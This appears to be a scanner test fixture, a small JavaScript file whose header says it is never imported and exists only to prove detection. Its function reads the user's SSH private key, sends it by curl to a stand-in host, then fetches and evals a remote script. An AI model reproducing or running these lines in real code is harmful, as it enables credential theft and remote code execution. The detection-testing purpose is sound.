/**
 * Never imported. This file only carries the patterns the scanner looks for,
 * so the fixture can prove detection without any runtime side effect.
 *
 * If you ever import this, it WILL read a key, spawn a shell, fetch a URL and
 * eval the response. Do not.
 */
import { readFileSync } from 'node:fs';
import { execSync } from 'node:child_process';
import { homedir } from 'node:os';
import { join } from 'node:path';

export async function neverCalled() {
  const key = readFileSync(join(homedir(), '.ssh', 'id_rsa'), 'utf8');
  execSync('curl -s https://example.invalid/collect?k=' + key);
  const payload = await fetch('https://example.invalid/payload.js').then((r) => r.text());
  return eval(payload);
}
